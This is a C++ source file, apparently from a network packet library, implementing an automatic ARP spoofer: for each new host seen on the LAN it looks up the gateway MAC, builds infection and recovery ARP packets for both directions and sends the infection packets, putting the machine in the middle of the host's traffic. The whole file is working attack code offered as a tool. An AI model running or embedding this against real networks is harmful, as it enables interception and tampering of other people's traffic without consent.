#include "gautoarpspoof.h"

// ----------------------------------------------------------------------------
// GAutoArpSpoof
// ----------------------------------------------------------------------------
void GAutoArpSpoof::processArp(GPacket* packet) {
	Q_ASSERT(packet->arpHdr_ != nullptr);
	GArpHdr* arpHdr = packet->arpHdr_;

	GIp sip = arpHdr->sip();
	GIp gwip = intf_->gateway();
	if (sip == intf_->ip() || sip == gwip)
		return;

	GFlow::IpFlowKey ipFlowKey(sip, gwip);
	if (flowMap_.find(ipFlowKey) != flowMap_.end()) return;

	GAtm::iterator it = atm_.find(gwip);
	if (it == atm_.end()) {
		atm_.insert(gwip, GMac::nullMac());
		if (!atm_.open()) {
			err = atm_.err;
			return;
		}
		bool res = atm_.wait();
		if (!res) {
			qWarning() << QString("can not find mac for %s").arg(QString(gwip));
			return;
		}
		it = atm_.find(gwip);
		Q_ASSERT(it != atm_.end());
	}
	GMac gwmac = it.value();

	Flow flow(sip, arpHdr->smac(), gwip, gwmac);
	flow.makePacket(&flow.infectPacket_, myMac_, true);
	flow.makePacket(&flow.recoverPacket_, myMac_, false);

	flowMap_.insert(ipFlowKey, flow);
	flowList_.push_back(flow);
	sendArpInfect(&flow);

	GFlow::IpFlowKey revIpFlowKey(gwip, sip);
	Flow revFlow(gwip, gwmac, sip, arpHdr->smac());
	revFlow.makePacket(&revFlow.infectPacket_, myMac_, true);
	revFlow.makePacket(&revFlow.recoverPacket_, myMac_, false);

	flowMap_.insert(revIpFlowKey, revFlow);
	{
		QMutexLocker(&flowList_.m_);
		flowList_.push_back(revFlow);
	}
	sendArpInfect(&revFlow);

	qDebug() << QString("new ip(%1) is detected").arg(QString(sip));
}
